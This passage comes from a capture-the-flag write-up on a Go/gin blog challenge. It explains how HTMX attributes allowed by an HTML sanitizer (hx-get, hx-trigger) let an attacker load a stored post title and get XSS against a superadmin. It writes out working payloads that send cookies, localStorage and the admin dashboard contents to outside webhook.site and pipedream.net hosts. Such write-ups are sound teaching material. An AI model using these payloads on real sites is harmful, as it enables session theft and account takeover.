string">&quot;hx-swap&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-target&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-trigger&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-vals&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;id&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;low&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;map&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;max&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;min&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;optimum&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">OnElements</span><span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;abbr&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;acronym&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;br&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;cite&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;code&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;dfn&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;em&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;figcaption&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;h1&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;h2&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;h3&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;h4&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;h5&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;h6&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hgroup&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hr&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;i&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;mark&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;pre&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;s&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;samp&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;small&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;strike&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;strong&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;sub&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;sup&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;tt&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;var&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;wbr&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">	html </span><span class="token operator">:=</span><span class=""> p</span><span class="token punctuation">.</span><span class="token function">Sanitize</span><span class="token punctuation">(</span><span class="">data</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">	</span><span class="token keyword">return</span><span class=""> html
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">ShowPost</span><span class="token punctuation">(</span><span class="">ctx </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">	postID </span><span class="token operator">:=</span><span class=""> ctx</span><span class="token punctuation">.</span><span class="token function">Param</span><span class="token punctuation">(</span><span class="token string">&quot;postid&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">	DB </span><span class="token operator">:=</span><span class=""> db</span><span class="token punctuation">.</span><span class="token function">GetDBconn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">	</span><span class="token keyword">var</span><span class=""> title </span><span class="token builtin">string</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">	</span><span class="token keyword">var</span><span class=""> data </span><span class="token builtin">string</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">	err </span><span class="token operator">:=</span><span class=""> DB</span><span class="token punctuation">.</span><span class="token function">QueryRow</span><span class="token punctuation">(</span><span class="token string">&quot;SELECT title, data FROM posts WHERE postid = $1&quot;</span><span class="token punctuation">,</span><span class=""> postID</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="">title</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">&amp;</span><span class="">data</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">	</span><span class="token keyword">if</span><span class=""> err </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">		fmt</span><span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="">err</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">	html </span><span class="token operator">:=</span><span class=""> </span><span class="token function">SanitizeData</span><span class="token punctuation">(</span><span class="">data</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">	ctx</span><span class="token punctuation">.</span><span class="token function">PureJSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">		</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">:</span><span class=""> title</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;data&quot;</span><span class="token punctuation">:</span><span class=""> html</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>It looks like our post data is directly rendered to the DOM via <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">innerHTML</code>, but we&#x27;re only allowed to use certain allowed tags and attributes defined by the sanitation policy.</p>
<p>Suspiciously, among the allowed attributes are HTMX-specific attributes like <a href="https://htmx.org/attributes/hx-get/"><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">hx-get</code></a>. Reading the documentation,</p>
<blockquote>
<p>The <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">hx-get</code> attribute will cause an element to issue a <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">GET</code> to the specified URL and swap the HTML into the DOM using a swap strategy:</p>
</blockquote>
<p>Then, we can circumvent the sanitizer by using <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">hx-get</code> to fetch our malicious payload via network request and swap it in to the DOM, giving us XSS.</p>
<p>By default, this swapping only triggers when the element is clicked, but we can use the <a href="https://htmx.org/attributes/hx-trigger/"><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">hx-trigger</code></a> property to swap in our payload on mount. Worse, however, is that <a href="https://htmx.org/reference/#config"><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">htmx.config.selfRequestsOnly</code> defaults to <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">true</code></a>, meaning that we can only send HTMX GET requests to the same domain.</p>
<p>We can host semi-arbitrary data on the same domain via posts, but we unfortunately can&#x27;t simply put our payload in the post data due to the sanitizer. Instead, we can make a post with arbitrary data whose <em>title</em> is our malicious payload, e.g.</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z"></path></svg> <!-- -->html<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token tag punctuation">&lt;</span><span class="token tag">img</span><span class="token tag"> </span><span class="token tag attr-name">src</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value">x</span><span class="token tag"> </span><span class="token tag special-attr attr-name">onerror</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&#x27;</span><span class="token tag special-attr attr-value value javascript language-javascript function">fetch</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript template-string string">https://webhook.site/e9569dad-ec09-4b1f-8125-3e35e1edd678?a=</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript operator">+</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript dom variable">document</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript property-access">cookie</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript operator">+</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript known-class-name class-name">JSON</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">stringify</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript dom variable">localStorage</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value punctuation">&#x27;</span><span class="token tag punctuation">&gt;</span></code></pre></div></div>
<p>(making sure not to use double quotes lest the payload get JSON-escaped).</p>
<p>Then, our malicious post data would look something like</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z"></path></svg> <!-- -->html<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">hx-get</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">/user/posts/5b3f1b37-3c01-4051-9a7f-1bbc020668e6</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">hx-trigger</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">load</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag attr-name">hx-swap</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">innerHTML</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span></code></pre></div></div>
<p>swapping in the first posts&#x27;s title and data into its <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">innerHTML</code> for XSS.</p>
<p>Looking at the superadmin dashboard,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.811 10.231c-.047 0-.058-.023-.035-.059l.246-.315c.023-.035.081-.058.128-.058h4.172c.046 0 .058.035.035.07l-.199.303c-.023.036-.082.07-.117.07zM.047 11.306c-.047 0-.059-.023-.035-.058l.245-.316c.023-.035.082-.058.129-.058h5.328c.047 0 .07.035.058.07l-.093.28c-.012.047-.058.07-.105.07zm2.828 1.075c-.047 0-.059-.035-.035-.07l.163-.292c.023-.035.07-.07.117-.07h2.337c.047 0 .07.035.07.082l-.023.28c0 .047-.047.082-.082.082zm12.129-2.36c-.736.187-1.239.327-1.963.514-.176.046-.187.058-.34-.117-.174-.199-.303-.327-.548-.444-.737-.362-1.45-.257-2.115.175-.795.514-1.204 1.274-1.192 2.22.011.935.654 1.706 1.577 1.835.795.105 1.46-.175 1.987-.77.105-.13.198-.27.315-.434H10.47c-.245 0-.304-.152-.222-.35.152-.362.432-.97.596-1.274a.315.315 0 01.292-.187h4.253c-.023.316-.023.631-.07.947a4.983 4.983 0 01-.958 2.29c-.841 1.11-1.94 1.8-3.33 1.986-1.145.152-2.209-.07-3.143-.77-.865-.655-1.356-1.52-1.484-2.595-.152-1.274.222-2.419.993-3.424.83-1.086 1.928-1.776 3.272-2.02 1.098-.2 2.15-.07 3.096.571.62.41 1.063.97 1.356 1.648.07.105.023.164-.117.2m3.868 6.461c-1.064-.024-2.034-.328-2.852-1.029a3.665 3.665 0 01-1.262-2.255c-.21-1.32.152-2.489.947-3.529.853-1.122 1.881-1.706 3.272-1.95 1.192-.21 2.314-.095 3.33.595.923.63 1.496 1.484 1.648 2.605.198 1.578-.257 2.863-1.344 3.962-.771.783-1.718 1.273-2.805 1.495-.315.06-.63.07-.934.106zm2.78-4.72c-.011-.153-.011-.27-.034-.387-.21-1.157-1.274-1.81-2.384-1.554-1.087.245-1.788.935-2.045 2.033-.21.912.234 1.835 1.075 2.21.643.28 1.285.244 1.905-.07.923-.48 1.425-1.228 1.484-2.233z"></path></svg> <!-- -->go<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">package</span><span class=""> dashboard
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">import</span><span class=""> </span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">	</span><span class="token string">&quot;fmt&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">	</span><span class="token string">&quot;os&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">	</span><span class="token string">&quot;github.com/gin-gonic/gin&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class=""></span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">SuperAdminDashboard</span><span class="token punctuation">(</span><span class="">ctx </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">	fmt</span><span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">&quot;SuperAdmin dashboard accessed&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">	ctx</span><span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;superAdminDash.tmpl&quot;</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">		</span><span class="token string">&quot;flag&quot;</span><span class="token punctuation">:</span><span class=""> os</span><span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">&quot;SUPERADMIN_FLAG&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">ViewPosts</span><span class="token punctuation">(</span><span class="">ctx </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">	ctx</span><span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;viewPost.tmpl&quot;</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">		</span><span class="token string">&quot;PostID&quot;</span><span class="token punctuation">:</span><span class=""> ctx</span><span class="token punctuation">.</span><span class="token function">Param</span><span class="token punctuation">(</span><span class="token string">&quot;postid&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">		</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">:</span><span class="">  </span><span class="token string">&quot;Click&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">		</span><span class="token string">&quot;data&quot;</span><span class="token punctuation">:</span><span class="">   </span><span class="token string">&quot;{{data|safe}}&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>it looks like sending the superadmin to <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">/superadmin/viewpost/{our malicious post id}</code> causes our payload to be <a href="https://mozilla.github.io/nunjucks/templating.html#safe">rendered into the DOM for XSS</a>, from where we can fetch <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">/superadmin/dashboard</code> to get the part 3 flag. Here&#x27;s a payload that does just that:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z"></path></svg> <!-- -->html<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token tag punctuation">&lt;</span><span class="token tag">img</span><span class="token tag"> </span><span class="token tag attr-name">src</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value">x</span><span class="token tag"> </span><span class="token tag special-attr attr-name">onerror</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&#x27;</span><span class="token tag special-attr attr-value value javascript language-javascript function">fetch</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript template-string string">/superadmin/dashboard</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">then</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript parameter">x</span><span class="token tag special-attr attr-value value javascript language-javascript arrow operator">=&gt;</span><span class="token tag special-attr attr-value value javascript language-javascript">x</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">text</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">then</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript parameter">x</span><span class="token tag special-attr attr-value value javascript language-javascript arrow operator">=&gt;</span><span class="token tag special-attr attr-value value javascript language-javascript function">fetch</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript template-string string">https://enhs7ezpdsxpw.x.pipedream.net/</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript operator">+</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript function">btoa</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript">x</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value punctuation">&#x27;</span><span class="token tag punctuation">&gt;</span></code></pre></div></div>
<p>Looking in <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">AdminDash.go</code>,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.811 10.231c-.047 0-.058-.023-.035-.059l.246-.315c.023-.035.081-.058.128-.058h4.172c.046 0 .058.035.035.07l-.199.303c-.023.036-.082.07-.117.07zM.047 11.306c-.047 0-.059-.023-.035-.058l.245-.316c.023-.035.082-.058.129-.058h5.328c.047 0 .07.035.058.07l-.093.28c-.012.047-.058.07-.105.07zm2.828 1.075c-.047 0-.059-.035-.035-.07l.163-.292c.023-.035.07-.07.117-.07h2.337c.047 0 .07.035.07.082l-.023.28c0 .047-.047.082-.082.082zm12.129-2.36c-.736.187-1.239.327-1.963.514-.176.046-.187.058-.34-.117-.174-.199-.303-.327-.548-.444-.737-.362-1.45-.257-2.115.175-.795.514-1.204 1.274-1.192 2.22.011.935.654 1.706 1.577 1.835.795.105 1.46-.175 1.987-.77.105-.13.198-.27.315-.434H10.47c-.245 0-.304-.152-.222-.35.152-.362.432-.97.596-1.274a.315.315 0 01.292-.187h4.253c-.023.316-.023.631-.07.947a4.983 4.983 0 01-.958 2.29c-.841 1.11-1.94 1.8-3.33 